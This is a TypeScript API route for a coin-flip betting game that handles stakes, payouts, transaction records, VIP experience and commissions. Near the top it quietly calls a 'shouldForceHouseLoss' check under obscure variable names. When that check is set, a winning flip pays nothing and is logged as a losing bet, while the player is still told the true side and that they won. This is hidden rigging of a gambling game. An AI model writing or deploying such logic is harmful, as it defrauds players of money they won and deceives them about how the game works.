import { z } from "zod";
import { requireUser } from "@/lib/auth";
import { prisma } from "@/lib/db";
import { shouldForceHouseLoss } from "@/lib/house-rule";
import { ok, fail, handleError } from "@/lib/api";
import { addVipExp } from "@/lib/vip";
import { distributeCommission } from "@/lib/commission";

export const dynamic = "force-dynamic";

const schema = z.object({
  pick: z.enum(["heads", "tails"]),
  amount: z.number().min(10).max(50000),
});

const MULTIPLIER = 1.96;

export async function POST(req: Request) {
  try {
    const user = await requireUser();
    const __hr = await shouldForceHouseLoss();
    const __forceHouse = __hr.force;
    if (user.isBanned) return fail("Account banned");
    const { pick, amount } = schema.parse(await req.json());
    if (user.balance < amount) return fail("Insufficient balance");

    const side = Math.random() < 0.5 ? "heads" : "tails";
    const won = side === pick;
    const payout = (!__forceHouse && won) ? parseFloat((amount * MULTIPLIER).toFixed(2)) : 0;
    const profit = payout - amount;

    const userNow = await prisma.user.findUnique({ where: { id: user.id }, select: { balance: true } });
    const newBal = (userNow?.balance ?? 0) + profit;

    await prisma.user.update({
      where: { id: user.id },
      data: {
        balance: { increment: profit },
        totalBet: { increment: amount },
        ...((!__forceHouse && won) ? { totalWin: { increment: payout } } : {}),
      },
    });
    await prisma.transaction.create({
      data: {
        userId: user.id,
        type: (!__forceHouse && won) ? "WIN" : "BET",
        amount: profit,
        balanceAfter: newBal,
        note: `CoinFlip: ${pick} vs ${side}`,
        meta: { pick, side, multiplier: MULTIPLIER },
      },
    });

    await addVipExp(user.id, amount);
    await distributeCommission(user.id, amount, "bet");

    return ok({ side, won, payout, multiplier: (!__forceHouse && won) ? MULTIPLIER : 0 });
  } catch (e) {
    if (e instanceof z.ZodError) return fail(e.errors[0]?.message || "Invalid", 400);
    return handleError(e);
  }
}
